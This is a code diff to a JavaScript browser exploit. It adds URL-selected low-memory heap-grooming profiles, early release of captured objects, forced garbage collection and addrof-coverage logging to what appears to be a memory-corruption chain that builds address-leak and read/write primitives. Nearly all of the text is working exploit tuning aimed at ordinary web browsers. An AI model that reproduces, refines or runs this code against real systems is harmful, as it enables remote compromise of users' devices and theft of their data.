@@ -13,13 +13,116 @@ const FUNCTION_BYTES = 0x20;
 const NATIVE_EXECUTABLE_BYTES = 0x38;
 const HOLDER_BYTES = 0x40;
 
+const HX1400_LIGHT_CORE =
+  new URLSearchParams(location.search).get("hx1400") === "1";
+
+const HX_MEM_LEVEL = (function () {
+  if (!HX1400_LIGHT_CORE) return 0;
+
+  try {
+    const q =
+      new URLSearchParams(location.search).get("mem");
+
+    const n =
+      parseInt(q || "2", 10);
+
+    if (
+      Number.isFinite(n) &&
+      n >= 1 &&
+      n <= 5
+    ) {
+      return n;
+    }
+  } catch (e) {}
+
+  return 2;
+})();
+
+const HX_MEM_PROFILES = [
+  null,
+
+  {
+    name: "mem1-balanced",
+    slots: 3000000,
+    drain: 48,
+    drainsz: 0x8000,
+    slab: 0x300000,
+    bfly: 0x60000,
+    sep: 0x8000,
+    early: 0x60000,
+    guard: 0x70000,
+    pred: 0x60000,
+    final: 0x60000,
+  },
+
+  {
+    name: "mem2-low",
+    slots: 1500000,
+    drain: 24,
+    drainsz: 0x8000,
+    slab: 0x200000,
+    bfly: 0x40000,
+    sep: 0x8000,
+    early: 0x40000,
+    guard: 0x50000,
+    pred: 0x40000,
+    final: 0x40000,
+  },
+
+  {
+    name: "mem3-verylow",
+    slots: 800000,
+    drain: 12,
+    drainsz: 0x4000,
+    slab: 0x100000,
+    bfly: 0x30000,
+    sep: 0x4000,
+    early: 0x30000,
+    guard: 0x40000,
+    pred: 0x30000,
+    final: 0x30000,
+  },
+
+  {
+    name: "mem4-minimum",
+    slots: 500000,
+    drain: 8,
+    drainsz: 0x4000,
+    slab: 0x100000,
+    bfly: 0x20000,
+    sep: 0x4000,
+    early: 0x20000,
+    guard: 0x30000,
+    pred: 0x20000,
+    final: 0x20000,
+  },
+
+  {
+    name: "mem5-extreme",
+    slots: 250000,
+    drain: 4,
+    drainsz: 0x4000,
+    slab: 0x10000,
+    bfly: 0x10000,
+    sep: 0x4000,
+    early: 0x10000,
+    guard: 0x18000,
+    pred: 0x10000,
+    final: 0x10000,
+  },
+];
+
+const HX_MEM =
+  HX_MEM_PROFILES[HX_MEM_LEVEL] || null;
+
+
 const CARRIER_SLOTS = (function () {
   try {
     const q = new URLSearchParams(location.search).get("slots");
     const n = q ? parseInt(q, 10) : 0;
     if (n >= 100000 && n <= 40000000) return n;
   } catch (e) {}
-  return 12000000;
+  return HX_MEM ? HX_MEM.slots : 12000000;
 })();
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
 const CAPTURE_DELAY_MS = 50;
@@ -41,16 +144,50 @@ const _gOverride = (function () {
 })();
 const _g = (name, dflt) =>
   typeof _gOverride[name] === "number" ? _gOverride[name] : dflt;
-if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;
+if (typeof _gOverride.drain === "number") {
+  DRAIN_COUNT = _gOverride.drain;
+} else if (HX_MEM) {
+  DRAIN_COUNT = HX_MEM.drain;
+}
 
-const DRAIN_SIZE = _g("drainsz", 0x10000);
-const SLAB_SIZE = _g("slab", 0x400000);
-const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
-const SEPARATOR_SIZE = _g("sep", 0x10000);
-const EARLY_HOLE_SIZE = _g("early", 0x70000);
-const GUARD_SIZE = _g("guard", 0x90000);
-const PREDECESSOR_SIZE = _g("pred", 0x80000);
-const FINAL_HOLE_SIZE = _g("final", 0x80000);
+const DRAIN_SIZE = _g("drainsz", HX_MEM ? HX_MEM.drainsz : 0x10000);
+const SLAB_SIZE = _g("slab", HX_MEM ? HX_MEM.slab : 0x400000);
+const BUTTERFLY_HOLE_SIZE = _g("bfly", HX_MEM ? HX_MEM.bfly : 0x81000);
+const SEPARATOR_SIZE = _g("sep", HX_MEM ? HX_MEM.sep : 0x10000);
+const EARLY_HOLE_SIZE = _g("early", HX_MEM ? HX_MEM.early : 0x70000);
+const GUARD_SIZE = _g("guard", HX_MEM ? HX_MEM.guard : 0x90000);
+const PREDECESSOR_SIZE = _g("pred", HX_MEM ? HX_MEM.pred : 0x80000);
+const FINAL_HOLE_SIZE = _g("final", HX_MEM ? HX_MEM.final : 0x80000);
+
+const __CORE_MEM_ESTIMATED_BYTES =
+  CARRIER_BYTES +
+  DRAIN_COUNT * DRAIN_SIZE +
+  SLAB_SIZE +
+  BUTTERFLY_HOLE_SIZE * 2 +
+  SEPARATOR_SIZE +
+  EARLY_HOLE_SIZE +
+  GUARD_SIZE +
+  PREDECESSOR_SIZE +
+  FINAL_HOLE_SIZE;
+
+globalThis.__CORE_MEM_INFO =
+  Object.freeze({
+    hx1400: HX1400_LIGHT_CORE,
+    memLevel: HX_MEM_LEVEL,
+    profile:
+      HX_MEM ? HX_MEM.name : null,
+
+    slots: CARRIER_SLOTS,
+    carrierBytes: CARRIER_BYTES,
+
+    drainCount: DRAIN_COUNT,
+    drainSize: DRAIN_SIZE,
+
+    slabSize: SLAB_SIZE,
+    estimatedBytes:
+      __CORE_MEM_ESTIMATED_BYTES,
+  });
+
 
 const RW_BUFFER_SIZE = 0x100;
 
@@ -713,6 +850,10 @@ function runAddrofCapture() {
     copiedLength = capturedString.length;
     for (let i = 0; i < 16; i++)
       capturedWords[i] = capturedString.charCodeAt(7 + i);
+
+    /* RELEASE_CAPTURED_STRING_EARLY */
+    capturedString = null;
+
     captureState = 1;
   } catch (error) {
     captureError = error;
@@ -1108,6 +1249,14 @@ function runGroomAndLoad() {
       finalHole,
     ]);
     loadHistoryCritical();
+
+    /* RELEASE_HISTORY_GRAPH_EARLY */
+    outerGraph = null;
+    fillerGraph = null;
+
+    try {
+      history.replaceState(null, "");
+    } catch (e) {}
   } catch (error) {
     try {
       clearPredecessor();
@@ -1179,6 +1328,19 @@ function beginComposition() {
   const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
   const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
 
+  /* ADDROF_COVERAGE_PATCH */
+  const requiredSourceBytes = fakeChars * 2;
+  const minimumSlots =
+    Math.ceil(requiredSourceBytes / 8);
+
+  emit(
+    "ADDROF-COVERAGE",
+    `chars=${copiedLength}` +
+    `-need=${requiredSourceBytes}` +
+    `-have=${CARRIER_BYTES}` +
+    `-minSlots=${minimumSlots}`
+  );
+
   emit("ADDROF-RETURNED", REVISION);
   emit("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
   emit(
@@ -1191,11 +1353,24 @@ function beginComposition() {
     finishEarlySafeAttempt(
       "ADDROF-FAIL",
       `repeat=${repeated}-distinct=${distinct}` +
-        `-plausible=${plausible}-covered=${sourceCovered}`,
+        `-plausible=${plausible}-covered=${sourceCovered}-minSlots=${minimumSlots}`,
       "addrof-validation",
     );
     return;
   }
+
+  /* RELEASE_ADDROF_OBJECTS_EARLY */
+  capturedString = null;
+  capturedWords = null;
+  preparedSymbolObject = null;
+  leakedScope = null;
+  getterCarrier = null;
+
+  try {
+    if (typeof globalThis.gc === "function") {
+      globalThis.gc();
+    }
+  } catch (e) {}
 
   hostAddress = a0;
   targetAddress = b0;
